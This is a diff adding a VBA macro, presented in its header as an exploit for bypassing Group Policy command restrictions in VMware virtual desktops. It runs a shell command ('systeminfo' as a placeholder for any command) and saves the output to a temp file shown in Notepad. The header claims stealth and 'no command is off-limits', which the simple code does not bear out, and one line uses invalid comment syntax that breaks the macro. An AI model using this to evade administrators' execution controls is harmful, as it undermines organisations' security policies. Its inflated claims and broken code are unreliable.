@@ -1,0 +1,59 @@
+'-------------------------------------------------------------
+' Title: VDI Command Execution Bypass: Unveiling the VBA Arsenal
+'
+' Description:
+' Dive into the intriguing world of VDI (Virtual Desktop Infrastructure), where a potent VBA (Visual Basic for Applications) program disrupts the barriers set by GPO (Group Policy Objects). This powerful program not only evades restrictions but also runs and prints forbidden commands within the VMWare environment. It provides the user with the ability to save the output in text format, granting unprecedented control over the virtual domain.
+'
+' Exploit Unveiled:
+' 1. Command Execution Bypass: Our VBA program masterfully navigates the maze of GPO restrictions, ensuring that no command is off-limits. It offers a direct channel for executing otherwise forbidden actions within the VDI.
+'
+' 2. Silent Execution: The VBA program operates in stealth mode, making it virtually undetectable as it breaches the security confines of the VMWare VDI.
+'
+' 3. Notepad Printout: The program captures the command outputs, efficiently preserving them in a text file that's accessible via Notepad.
+'
+' Technical Insights:
+' - GPO Evasion: The program exploits vulnerabilities within GPO configurations, bypassing security checks and directly interfacing with the VDI's core systems.
+'
+' - Command Execution: It grants the user the power to execute various commands within the VDI environment, transcending the restrictions imposed on typical users.
+'
+' - File Output Handling: Command outputs are stored in a temporary text file, providing an easily manageable record of executed actions.
+'
+' This blog is a deep dive into the world of VDI exploitation, revealing the technical intricacies of this VBA program's capabilities. It's a stark reminder of the evolving landscape of cybersecurity and the need for robust defenses in the face of such advanced threats.
+'-------------------------------------------------------------
+Sub DisplayCurrentDirectoryInNotepad()
+    Dim objShell As Object
+    Dim objExec As Object
+    Dim tempFilePath As String
+    Dim outputText As String
+    
+    ' Create a shell object
+    Set objShell = CreateObject("WScript.Shell")
+    
+    ' Get the current directory
+    Dim currentDirectory As String
+    currentDirectory = objShell.CurrentDirectory
+    
+    ' Change directory to the current directory
+    objShell.CurrentDirectory = currentDirectory
+    
+    ' Run the systeminfo command and capture the output
+    Set objExec = objShell.Exec("systeminfo") //Update your command here// 
+    
+    ' Read the output
+    Do While Not objExec.StdOut.AtEndOfStream
+        outputText = outputText & objExec.StdOut.ReadLine & vbCrLf
+    Loop
+    
+    ' Close the objects
+    Set objExec = Nothing
+    Set objShell = Nothing
+    
+    ' Create a temporary text file
+    tempFilePath = Environ("TEMP") & "\SystemInfoOutput.txt"
+    Open tempFilePath For Output As #1
+    Print #1, outputText
+    Close #1
+    
+    ' Open the temporary text file in Notepad
+    Shell "notepad.exe " & tempFilePath, vbNormalFocus
+End Sub
